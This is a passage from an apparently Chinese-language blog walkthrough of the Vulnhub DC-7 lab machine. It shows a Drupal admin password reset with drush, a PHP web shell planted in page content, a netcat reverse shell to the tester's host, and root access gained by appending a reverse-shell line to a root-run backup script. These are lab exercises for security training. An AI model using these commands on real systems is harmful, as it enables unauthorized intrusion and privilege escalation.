href=\"https://drupalchina.gitbooks.io/begining-drupal8-cn/content/chapters/chapter-15.html\"\u003ehttps://drupalchina.gitbooks.io/begining-drupal8-cn/content/chapters/chapter-15.html\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e找到 ： \u003ccode\u003euser-password\u003c/code\u003e 为具有指定名称的用户账户设置或重置密码\u003c/p\u003e\n\u003cp\u003e可以修改用户密码，可以尝试修改\u003ccode\u003eadmin\u003c/code\u003e用户的密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e drush user-password USERNAME --password=\u003cspan class=\"hljs-string\"\u003e\"SOMEPASSWORD\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e修改成功，修改前记得切换目录到\u003ccode\u003eDrupal\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003edc7user@dc-\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e:/var/www/html$ drush user-password admin --password=\u003cspan class=\"hljs-string\"\u003e\"123456\"\u003c/span\u003e\nChanged password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e admin  \n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e后台getshell\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e登陆后台，寻找可利用的点\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubDC-7/image37.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e本来想直接修改**\u003ccode\u003eWelcome to DC-7\u003c/code\u003e** 的内容为一句话木马，但是发现没有解析，百度后知道\u003ccode\u003eDrupal\u003c/code\u003e为了安全将\u003ccode\u003ePHP\u003c/code\u003e独立为了一个模块，下面是模块链接🔗\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://www.drupal.org/project/php\"\u003ehttps://www.drupal.org/project/php\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e然后在\u003ccode\u003eExtend\u003c/code\u003e安装该拓展，前提是\u003ccode\u003eUpdate Manager\u003c/code\u003e安装了\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e检查\u003ccode\u003eUpdate Manager\u003c/code\u003e 是否安装了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubDC-7/image38.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e然后\u003ccode\u003eExtend\u003c/code\u003e 安装下载的拓展\u003c/p\u003e\n\u003cp\u003e安装后选择 开启该模块\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubDC-7/image39.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubDC-7/image40.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e安装完后，我们来到 \u003ccode\u003eContent\u003c/code\u003e 选项，选择**\u003ccode\u003eWelcome to DC-7\u003c/code\u003e** edit编辑\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubDC-7/image41.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e内容改为一句木马，然后内容格式化改为\u003ccode\u003ephp\u003c/code\u003e ，然后保存\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e保存后复制页面链接使用蚁🗡连接，然后使用蚁🗡反弹\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e(www-data:/var/www/html) $ nc \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.151\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e -e /\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/bash\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获得\u003ccode\u003ewww-data\u003c/code\u003e的\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ewhoami\nwww-data\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e我们知道\u003ccode\u003ebackups.sh\u003c/code\u003e脚本属主为\u003ccode\u003eroot\u003c/code\u003e，属组为\u003ccode\u003ewww-data\u003c/code\u003e ，回到\u003ccode\u003ebackups.sh\u003c/code\u003e的目录，将反弹\u003ccode\u003eshell\u003c/code\u003e语句插入脚本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eecho \u003cspan class=\"hljs-string\"\u003e\"nc 192.168.75.151 1233 -e /bin/bash\"\u003c/span\u003e \u003e\u003e backups.sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e插入后等待任务自动执行，就能获得\u003ccode\u003eroot\u003c/code\u003e的权限了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enc -lvp \u003cspan class=\"hljs-number\"\u003e1233\u003c/span\u003e\nlistening on [\u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e1233\u003c/span\u003e ...\n\n\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.178\u003c/span\u003e: inverse host lookup failed: Unknown host\nconnect to [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.151\u003c/span\u003e] \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e (UNKNOWN) [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.178\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e54920\u003c/span\u003e\nuid=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) gid=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) groups=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root)\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e读取\u003ccode\u003eflag\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# cat theflag.txt\u003c/span\u003e\n\n\u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e       \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e          \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e      8888888b.                             \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \n\u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e   o   \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e          \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e      \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e  \u003cspan class=\"hljs-string\"\u003e\"Y88b                            888 888 888 888 \n888  d8b  888          888 888      888    888                            888 888 888 888 \n888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 \n888d88888b888 d8P  Y8b 888 888      888    888 d88\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"88b 888 \"\u003c/span\u003e88b d8P  Y8b \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \n88888P Y88888 \u003cspan class=\"hljs-number\"\u003e88888888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e      \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e    \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e88888888\u003c/span\u003e Y8P Y8P Y8P Y8P \n8888P   Y8888 Y8b.     \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e      \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e  .d88P Y88.\u003cspan class=\"hljs-number\"\u003e.88\u003c/span\u003eP \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e Y8b.      \u003cspan class=\"hljs-string\"\u003e\"   \"\u003c/span\u003e   \u003cspan class=\"hljs-string\"\u003e\"   \"\u003c/span\u003e  \n888P     Y888  \u003cspan class=\"hljs-string\"\u003e\"Y8888  888 888      8888888P\"\u003c/span\u003e   \u003cspan class=\"hljs-string\"\u003e\"Y88P\"\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e888\u003c/span\u003e  \u003cspan class=\"hljs-string\"\u003e\"Y8888  888 888 888 888 \n\nCongratulations!!!\n\nHope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those\nwho have provided feedback, and all those who have taken the time to complete these little\nchallenges.\n\nI'm sending out an especially big thanks to:\n\n@4nqr34z\n@D4mianWayne\n@0xmzfr\n@theart42\n\nIf you enjoyed this CTF, send me a tweet via @DCAU7.\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e","title":"Vulnhub - DC-7","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"DC-7\n\n https://www.vulnhub.com/entry/dc-7,356/\n \n\n端口扫描主机发现\n\n1. 探测存活主机，`178`是靶机\n    \n    \n    \n2. 探测主机所有开放端口\n    \n    \n    \n3. 探测服务版本以及系统版本\n    \n    \n    \n4. 扫描漏洞\n    \n    \n    \n\nweb渗透\n\n1. 访问页面，发现是 `Dr..."},"recentPosts":[{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"},{"id":"TheHackersLabsElevator","title":"TheHackersLabs - Elevator","date":"2025-09-29","isEncrypted":false,"year":"2025","month":"09","day":"29"}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"04","day":"02","id":"VulnhubDC-7"},"buildId":"QF_69xfpA3_zMvnMTdy4T","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>